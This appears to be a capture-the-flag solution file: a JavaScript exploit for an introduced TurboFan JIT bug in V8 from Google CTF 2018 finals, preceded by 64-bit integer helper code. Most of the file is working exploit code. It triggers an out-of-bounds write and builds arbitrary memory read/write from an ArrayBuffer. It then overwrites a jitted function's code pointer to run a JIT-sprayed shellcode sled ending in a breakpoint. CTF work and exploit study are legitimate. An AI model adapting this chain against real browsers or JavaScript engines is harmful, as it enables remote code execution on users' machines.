//
// Tiny module that provides big (64bit) integers.
//
// Copyright (c) 2016 Samuel Groß
//
// Requires utils.js
//

// Datatype to represent 64-bit integers.
//
// Internally, the integer is stored as a Uint8Array in little endian byte order.
//
// Utility functions.
//
// Copyright (c) 2016 Samuel Groß
//

// Return the hexadecimal representation of the given byte.
function hex(b) {
    return ('0' + b.toString(16)).substr(-2);
}

// Return the hexadecimal representation of the given byte array.
function hexlify(bytes) {
    var res = [];
    for (var i = 0; i < bytes.length; i++)
        res.push(hex(bytes[i]));

    return res.join('');
}

// Return the binary data represented by the given hexdecimal string.
function unhexlify(hexstr) {
    if (hexstr.length % 2 == 1)
        throw new TypeError("Invalid hex string");

    var bytes = new Uint8Array(hexstr.length / 2);
    for (var i = 0; i < hexstr.length; i += 2)
        bytes[i/2] = parseInt(hexstr.substr(i, 2), 16);

    return bytes;
}

function hexdump(data) {
    if (typeof data.BYTES_PER_ELEMENT !== 'undefined')
        data = Array.from(data);

    var lines = [];
    for (var i = 0; i < data.length; i += 16) {
        var chunk = data.slice(i, i+16);
        var parts = chunk.map(hex);
        if (parts.length > 8)
            parts.splice(8, 0, ' ');
        lines.push(parts.join(' '));
    }

    return lines.join('\n');
}

// Simplified version of the similarly named python module.
var Struct = (function() {
    // Allocate these once to avoid unecessary heap allocations during pack/unpack operations.
    var buffer      = new ArrayBuffer(8);
    var byteView    = new Uint8Array(buffer);
    var uint32View  = new Uint32Array(buffer);
    var float64View = new Float64Array(buffer);

    return {
        pack: function(type, value) {
            var view = type;        // See below
            view[0] = value;
            return new Uint8Array(buffer, 0, type.BYTES_PER_ELEMENT);
        },

        unpack: function(type, bytes) {
            if (bytes.length !== type.BYTES_PER_ELEMENT)
                throw Error("Invalid bytearray");

            var view = type;        // See below
            byteView.set(bytes);
            return view[0];
        },

        // Available types.
        int8:    byteView,
        int32:   uint32View,
        float64: float64View
    };
})();

function Int64(v) {
    // The underlying byte array.
    var bytes = new Uint8Array(8);

    switch (typeof v) {
        case 'number':
            v = '0x' + Math.floor(v).toString(16);
        case 'string':
            if (v.startsWith('0x'))
                v = v.substr(2);
            if (v.length % 2 == 1)
                v = '0' + v;

            var bigEndian = unhexlify(v, 8);
            bytes.set(Array.from(bigEndian).reverse());
            break;
        case 'object':
            if (v instanceof Int64) {
                bytes.set(v.bytes());
            } else {
                if (v.length != 8)
                    throw TypeError("Array must have excactly 8 elements.");
                bytes.set(v);
            }
            break;
        case 'undefined':
            break;
        default:
            throw TypeError("Int64 constructor requires an argument.");
    }

    // Return a double whith the same underlying bit representation.
    this.asDouble = function() {
        // Check for NaN
        if (bytes[7] == 0xff && (bytes[6] == 0xff || bytes[6] == 0xfe))
            throw new RangeError("Integer can not be represented by a double");

        return Struct.unpack(Struct.float64, bytes);
    };

    // Return a javascript value with the same underlying bit representation.
    // This is only possible for integers in the range [0x0001000000000000, 0xffff000000000000)
    // due to double conversion constraints.
    this.asJSValue = function() {
        if ((bytes[7] == 0 && bytes[6] == 0) || (bytes[7] == 0xff && bytes[6] == 0xff))
            throw new RangeError("Integer can not be represented by a JSValue");

        // For NaN-boxing, JSC adds 2^48 to a double value's bit pattern.
        this.assignSub(this, 0x1000000000000);
        var res = Struct.unpack(Struct.float64, bytes);
        this.assignAdd(this, 0x1000000000000);

        return res;
    };

    this.lower = function() {
        return bytes[0] + 256 * bytes[1] + 256*256*bytes[2] + 256*256*256*bytes[3];
    };

    this.upper = function() {
        return bytes[4] + 256 * bytes[5] + 256*256*bytes[6] + 256*256*256*bytes[7];
    };

    // Return the underlying bytes of this number as array.
    this.bytes = function() {
        return Array.from(bytes);
    };

    // Return the byte at the given index.
    this.byteAt = function(i) {
        return bytes[i];
    };

    // Return the value of this number as unsigned hex string.
    this.toString = function() {
        return '0x' + hexlify(Array.from(bytes).reverse());
    };

    // Basic arithmetic.
    // These functions assign the result of the computation to their 'this' object.

    // Decorator for Int64 instance operations. Takes care
    // of converting arguments to Int64 instances if required.
    function operation(f, nargs) {
        return function() {
            if (arguments.length != nargs)
                throw Error("Not enough arguments for function " + f.name);
            for (var i = 0; i < arguments.length; i++)
                if (!(arguments[i] instanceof Int64))
                    arguments[i] = new Int64(arguments[i]);
            return f.apply(this, arguments);
        };
    }

    // this = -n (two's complement)
    this.assignNeg = operation(function neg(n) {
        for (var i = 0; i < 8; i++)
            bytes[i] = ~n.byteAt(i);

        return this.assignAdd(this, Int64.One);
    }, 1);

    // this = a + b
    this.assignAdd = operation(function add(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) + b.byteAt(i) + carry;
            carry = cur > 0xff | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);

    // this = a - b
    this.assignSub = operation(function sub(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) - b.byteAt(i) - carry;
            carry = cur < 0 | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);
}

// Constructs a new Int64 instance with the same bit representation as the provided double.
Int64.fromDouble = function(d) {
    var bytes = Struct.pack(Struct.float64, d);
    return new Int64(bytes);
};

// Convenience functions. These allocate a new Int64 to hold the result.

// Return -n (two's complement)
function Neg(n) {
    return (new Int64()).assignNeg(n);
}

// Return a + b
function Add(a, b) {
    return (new Int64()).assignAdd(a, b);
}

// Return a - b
function Sub(a, b) {
    return (new Int64()).assignSub(a, b);
}

// Some commonly used numbers.
Int64.Zero = new Int64(0);
Int64.One = new Int64(1);

// modified from https://github.com/LiveOverflow/lo_nintendoswitch/blob/master/opc1.html#L36
function gc() {
    var x = new Array(0x800);
    for(y = 0; y < x.length; y++) {
        x[y] = new Uint32Array(0x10000);
    }
    for(y = 0; y < x.length; y++) {
        x[y] = 0;
    }
}

// exploit for just-in-time, googlectf 2018 finals
// it is an introduced jit bug in a turbofan graph reducer

// the challenge adds an addition reducer that is meant to
// convert expressions of the form (1 + 2) + [x] to 3 + [x]
// it feels like there must be some sort of side effects overlooked on the (1 + 2)

// ideas: either a problem with changing around what the left node is a value input to,
// or a problem with double overflow/underflow

// -0 = 0x0000726ea5bae678

// victim function to be jitted
function sc_func(x, y) {

    // JIT spray - this example is a nop sled ending in int3
    // Point is to prove that we are generating code of the form
    // 01: xor eax, 0x01eb9090
    // 06: xor eax, 0x01eb9090
    // 0b: xor eax, 0x01eb9090
    // ... etc ...
    var mynum = x ^
    0x23840952 ^
    0x01eb9090 ^
    0x01eb9090 ^
    0x01eb9090 ^
    0x01eb9090 ^
    0x01eb9090 ^
    0x01eb9090 ^
    0x01eb9090 ^
    0x01eb9090 ^
    0x01eb9090 ^
    0x01eb9090 ^
    0x01eb9090 ^
    0x01eb9090 ^
    0x01eb9090 ^
    0x01eb9090 ^
    0x01eb9090 ^
    0xcccccccc ^
    0x23840952 ^ 
    0x23840952;

    return mynum + y;
}

for(x = 0; x < 0x2000; x++) sc_func(1, 2);

function spooky2(a) {
    let x = -Infinity;
    if (a) {
        x = Number.MIN_VALUE;
    }
    let myvar = x + (Number.MAX_VALUE);
    let ret = (myvar + (Number.MAX_VALUE));
    return ret;
}

function spooky(o, a) {
    return +(Object.is(spooky2(a), o.b));
}

var victim = undefined;
var manipulate = undefined;
var manip = undefined;

function jitme(a, i, i2) {

    let o = {b: NaN};

    let typecast = new Uint32Array(2);
    typecast[0] = i;
    typecast[1] = i2;
    let idx = typecast[0];
    let idx2 = typecast[1];

    let oob = [1.1, 1.1, 1.1, 1.1];
    let localvictim = [2.2, 2.2, 2.2, 2.2, 2.2, 2.2, 2.2, 2.2];
    var localbuf = new ArrayBuffer(0x20);
    victim = localvictim;
    manipulate = localbuf;
    manip = [localbuf,  0x41414141, sc_func];

    let ret = spooky(o, a);

    oob[ret * idx] = 4.345847379897e-311; // length of 0x800
    oob[ret * idx2] = 4.345847379897e-311; // length of 0x800
    return localvictim;
}

jitme(1, 0, 0);
jitme(0, 0, 0);
for(x = 0; x < 0x1000; x++) jitme(1, 0, 0);
//%OptimizeFunctionOnNextCall(jitme);

console.log("beginning interesting call");
console.log("result is " + jitme(1, 0, 0));
jitme(0, 0x11, 0x5); // trigger the bug to write to the victim length and element array length

if (victim.length > 8) {
    console.log("[+] bug was triggered!");
} else {
    throw ("[!] couldn't trigger the bug :(");
}

// find the arraybuffer length, which tells us where its backing store is
let len_idx = 0;
let bs_idx = 0;
for(x = 0; x < victim.length; x++) {
    // find the length of 0x20
    if (victim[x] == 6.7903865311e-313) {
        console.log("[+] found the length idx (" + x + ")");
        len_idx = x;
        bs_idx = x + 1;
        console.log("[+] bs ptr is " + Int64.fromDouble(victim[bs_idx]).toString());
        break;
    }
}

if (len_idx == 0) {
    throw "[!] couldn't find the length idx!";
}

// set up arb r/w
function r64(addr) {
    victim[bs_idx] = addr.asDouble();
    let myview = new Float64Array(manipulate);
    return Int64.fromDouble(myview[0]);
}

function writen(addr, data) {
    victim[bs_idx] = addr.asDouble();
    let myview = new Uint8Array(manipulate);
    for(x = 0; x < data.length; x++) {
        myview[x] = data[x];
    }
}

//%DebugPrint(manip[2]);

let func_idx = 0;
let funcaddr = 0;
// find the function in the manip array
for(x = 0; x < victim.length; x++) {
    // find the special 0x41414141 marker value
    if (victim[x] == 2261634.0) {
        func_idx = x + 1;
        funcaddr = Int64.fromDouble(victim[func_idx]);
        console.log("[+] function addr is " + funcaddr.toString());
        break;
    }
}

if (funcaddr == 0) {
    throw "[!} couldn't find jitted function";
}

// grab the function code location
var code_loc = Add(funcaddr, new Int64(0x2f));
var codeaddr = r64(code_loc);
console.log(code_loc.toString() + ": " + codeaddr.toString());

// v8 will jump to codeaddr + 0x3f
// our jit spray starts at codeaddr + 0x3f + 0x5b
writen(code_loc, Add(codeaddr, new Int64(0x5b)).bytes());

//writen(code_loc, [0, 0, 0, 0, 0, 0, 0, 0]);

console.log("[+] code overwitten successfully");
console.log("[+] press enter to hit the breakpoint we wrote!")
readline();
sc_func();
readline();